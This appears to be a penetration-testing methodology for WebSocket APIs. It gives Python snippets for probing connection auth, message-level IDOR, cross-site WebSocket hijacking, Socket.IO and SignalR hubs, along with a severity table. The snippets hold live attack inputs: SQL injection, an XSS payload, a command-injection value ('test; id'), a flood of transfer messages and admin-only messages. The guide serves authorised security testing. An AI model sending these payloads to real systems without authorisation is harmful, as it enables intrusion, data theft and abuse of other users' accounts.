# WebSocket API Testing

Testing methodology for WebSocket (WS/WSS) APIs beyond GraphQL subscriptions.

## Detection

- `Upgrade: websocket` header in HTTP traffic
- `Connection: Upgrade` response
- `wss://` or `ws://` URLs in JS bundles
- Socket.IO: `/socket.io/?EIO=4&transport=websocket`
- SignalR: `/hub` endpoints with `negotiate` + `connect`

## Phase 2 (AuthN/AuthZ) — WebSocket-Specific

### 1. Connection-Level Auth
```python
import websocket
import json

# Test: connect without auth token
ws = websocket.create_connection("wss://api.target.com/ws")
# If connects → missing auth on WS upgrade

# Test: connect with expired/invalid token
ws = websocket.create_connection("wss://api.target.com/ws",
    header=["Authorization: Bearer expired_token"])

# Test: connect with another user's token
ws = websocket.create_connection("wss://api.target.com/ws",
    header=["Authorization: Bearer user_b_token"])
```

### 2. Message-Level Auth (CRITICAL)
Many apps authenticate the WS connection but NOT individual messages:
```python
# Authenticated as User A, send message targeting User B's resources
ws.send(json.dumps({
    "action": "get_account",
    "account_id": "USER_B_ID"  # IDOR via WebSocket
}))
response = ws.recv()
```

### 3. Cross-Site WebSocket Hijacking (CSWSH)
```python
# Check if Origin header is validated
ws = websocket.create_connection("wss://api.target.com/ws",
    origin="https://evil.com",
    cookie="session=victim_cookie")
# If connects → CSWSH (Critical if authenticated)
```

## Phase 3 (Injection & Logic) — WebSocket-Specific

### 4. Message Manipulation
```python
# SQLi in WS message
ws.send(json.dumps({"search": "' OR 1=1--"}))

# Command injection
ws.send(json.dumps({"filename": "test; id"}))

# XSS (if messages rendered in UI)
ws.send(json.dumps({"message": "<img src=x onerror=alert(1)>"}))
```

### 5. Rate Limiting (usually absent on WS)
```python
# WS rarely has rate limiting — test rapid-fire messages
for i in range(1000):
    ws.send(json.dumps({"action": "transfer", "amount": 1}))
```

### 6. Message Type Confusion
```python
# Send admin-only message types as regular user
ws.send(json.dumps({"type": "admin_broadcast", "content": "test"}))
ws.send(json.dumps({"type": "user_delete", "user_id": "123"}))

# Send unexpected message format
ws.send("raw string instead of JSON")
ws.send(json.dumps({"action": None}))
ws.send(b'\x00\x01\x02\x03')  # binary frame
```

### 7. Subscription Escalation
```python
# Subscribe to channels you shouldn't access
ws.send(json.dumps({"subscribe": "admin_notifications"}))
ws.send(json.dumps({"subscribe": "user_123_private"}))
ws.send(json.dumps({"subscribe": "*"}))  # wildcard
```

## Socket.IO Specific

```python
# Socket.IO uses event-based messaging
# Enumerate events from JS bundle: grep -oE "socket\.(on|emit)\(['\"]([^'\"]+)" bundle.js

# Test unauthorized event emission
import socketio
sio = socketio.Client()
sio.connect("https://target.com", headers={"Authorization": "Bearer token"})
sio.emit("admin_action", {"command": "list_users"})
```

## SignalR Specific

```python
# SignalR negotiate → get connection token
import requests
r = requests.post("https://target.com/hub/negotiate",
    headers={"Authorization": "Bearer token"})
conn_id = r.json()["connectionId"]

# Invoke hub methods
ws = websocket.create_connection(
    f"wss://target.com/hub?id={conn_id}")
# SignalR protocol: {"type":1,"target":"MethodName","arguments":[...]}
ws.send(json.dumps({"type": 1, "target": "AdminMethod", "arguments": []}) + "\x1e")
```

## Findings Template

| Finding Pattern | Severity | Condition |
|----------------|----------|-----------|
| No auth on WS connection | High | Sensitive data flows through WS |
| CSWSH (Origin not validated) | High | Session cookie sent on upgrade |
| Message-level IDOR | High | Can access other users' data via WS messages |
| No rate limiting on WS | Medium | Enables brute-force or DoS |
| Admin message types accessible | High/Critical | Privilege escalation |
| SQLi/XSS via WS message | High/Critical | Standard injection impact |

## Tools

- `websocat` — CLI WebSocket client: `websocat wss://target.com/ws`
- `wscat` — Node.js WS client: `wscat -c wss://target.com/ws -H "Auth: Bearer x"`
- Burp Suite — WebSocket history tab (intercept + modify)
- Python `websocket-client` — scripted testing (examples above)

## Pitfalls

- WS connections are persistent — one bad message may not disconnect you (silent failures)
- Binary frames: some WS APIs use protobuf/msgpack, not JSON — check Content-Type negotiation
- Ping/pong frames: servers may disconnect idle connections — implement heartbeat in scripts
- Load balancers: WS stickiness required — some tests fail due to LB routing changes mid-session
